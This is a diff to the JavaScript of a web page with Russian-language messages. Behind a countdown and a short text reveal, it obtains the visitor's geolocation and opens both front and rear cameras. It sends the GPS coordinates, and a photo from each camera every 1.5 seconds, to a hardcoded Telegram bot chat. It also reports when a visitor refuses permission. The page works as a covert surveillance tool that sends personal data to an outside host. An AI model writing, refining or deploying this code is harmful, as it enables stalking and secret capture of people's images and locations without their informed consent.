@@ -3,52 +3,106 @@ const TELEGRAM_CHAT_ID = '8071841674';
 
 const countdownEl = document.getElementById('countdown');
 const hazbikText = document.getElementById('hazbikText');
-const videoEl = document.getElementById('video');
-const canvasEl = document.getElementById('canvas');
 const reloadBtn = document.getElementById('reloadBtn');
 
-let currentCamera = 'user'; // фронтальная или задняя
-let stream = null;
+const videoFront = document.getElementById('videoFront');
+const videoBack = document.getElementById('videoBack');
+
+const canvasFront = document.getElementById('canvasFront');
+const canvasBack = document.getElementById('canvasBack');
+
+let streamFront = null;
+let streamBack = null;
 let photoInterval = null;
 
-async function requestPermissions() {
+async function sendTelegramMessage(text) {
   try {
-    await requestGeo();
-    await requestCameraTest();
-    startCountdown();
-  } catch {
-    showReloadButton();
-  }
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+    });
+  } catch {}
 }
 
-function requestGeo() {
+async function sendPhoto(blob) {
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', blob, 'photo.jpg');
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch {}
+}
+
+async function sendLocationToTelegram(lat, lon) {
+  const url = `https://maps.google.com/?q=${lat},${lon}`;
+  await sendTelegramMessage(`🌍 Геолокация: ${url}`);
+}
+
+function takePhoto(videoEl, canvasEl) {
+  const ctx = canvasEl.getContext('2d');
+  canvasEl.width = videoEl.videoWidth;
+  canvasEl.height = videoEl.videoHeight;
+  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+  return new Promise(resolve => {
+    canvasEl.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+  });
+}
+
+async function startPhotoLoop() {
+  photoInterval = setInterval(async () => {
+    if (videoFront.readyState >= 2) {
+      const blobFront = await takePhoto(videoFront, canvasFront);
+      sendPhoto(blobFront);
+    }
+    if (videoBack.readyState >= 2) {
+      const blobBack = await takePhoto(videoBack, canvasBack);
+      sendPhoto(blobBack);
+    }
+  }, 1500);
+}
+
+function showReloadButton() {
+  countdownEl.style.display = 'none';
+  hazbikText.style.display = 'none';
+  reloadBtn.style.display = 'block';
+  reloadBtn.onclick = () => location.reload();
+
+  if (photoInterval) clearInterval(photoInterval);
+  if (streamFront) streamFront.getTracks().forEach(t => t.stop());
+  if (streamBack) streamBack.getTracks().forEach(t => t.stop());
+}
+
+async function requestGeo() {
   return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) return reject();
+    if (!navigator.geolocation) reject();
     navigator.geolocation.getCurrentPosition(
-      pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        sendLocationToTelegram(lat, lon);
-        resolve();
-      },
-      err => reject(err),
+      pos => resolve(pos.coords),
+      () => reject(),
       { enableHighAccuracy: true, timeout: 7000 }
     );
   });
 }
 
-async function requestCameraTest() {
-  const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
-  stopStream(testStream);
-  return Promise.resolve();
+async function requestCamera(facingMode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+    return stream;
+  } catch {
+    throw new Error('Camera denied');
+  }
 }
 
-function startCountdown() {
-  let count = 3;
-  countdownEl.textContent = count;
+async function startCountdown() {
   countdownEl.style.display = 'block';
   hazbikText.style.display = 'none';
   reloadBtn.style.display = 'none';
+
+  let count = 3;
+  countdownEl.textContent = count;
 
   const interval = setInterval(() => {
     count--;
@@ -56,77 +110,33 @@ function startCountdown() {
       clearInterval(interval);
       countdownEl.style.display = 'none';
       hazbikText.style.display = 'block';
-
       setTimeout(() => {
         hazbikText.style.display = 'none';
         reloadBtn.style.display = 'block';
       }, 3000);
-
-      startCameraCycle();
     } else {
       countdownEl.textContent = count;
     }
   }, 1000);
 }
 
-async function startCameraCycle() {
-  photoInterval = setInterval(async () => {
-    try {
-      if (stream) {
-        stopStream(stream);
-        videoEl.srcObject = null;
-      }
+async function init() {
+  try {
+    const coords = await requestGeo();
+    await sendLocationToTelegram(coords.latitude, coords.longitude);
 
-      currentCamera = currentCamera === 'user' ? 'environment' : 'user';
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
-      videoEl.srcObject = stream;
-      await new Promise(res => (videoEl.onloadedmetadata = res));
-      sendPhotoToTelegram();
-    } catch {
-      clearInterval(photoInterval);
-      showReloadButton();
-    }
-  }, 3000);
+    streamFront = await requestCamera('user');
+    videoFront.srcObject = streamFront;
+
+    streamBack = await requestCamera('environment');
+    videoBack.srcObject = streamBack;
+
+    startCountdown();
+    startPhotoLoop();
+  } catch (e) {
+    await sendTelegramMessage('❌ Пользователь отказал в доступе к камере или геолокации.');
+    showReloadButton();
+  }
 }
 
-function sendPhotoToTelegram() {
-  const ctx = canvasEl.getContext('2d');
-  canvasEl.width = videoEl.videoWidth;
-  canvasEl.height = videoEl.videoHeight;
-  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-  canvasEl.toBlob(blob => {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', blob, `${currentCamera}_photo.jpg`);
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    }).catch(() => {});
-  }, 'image/jpeg', 0.8);
-}
-
-function sendLocationToTelegram(lat, lon) {
-  const url = `https://maps.google.com/?q=${lat},${lon}`;
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `🌍 Геолокация: ${url}`
-    })
-  });
-}
-
-function stopStream(s) {
-  s.getTracks().forEach(track => track.stop());
-}
-
-function showReloadButton() {
-  reloadBtn.style.display = 'block';
-  reloadBtn.onclick = () => location.reload();
-  countdownEl.style.display = 'none';
-  hazbikText.style.display = 'none';
-}
-
-// Запускаем всё
-requestPermissions();
+init();
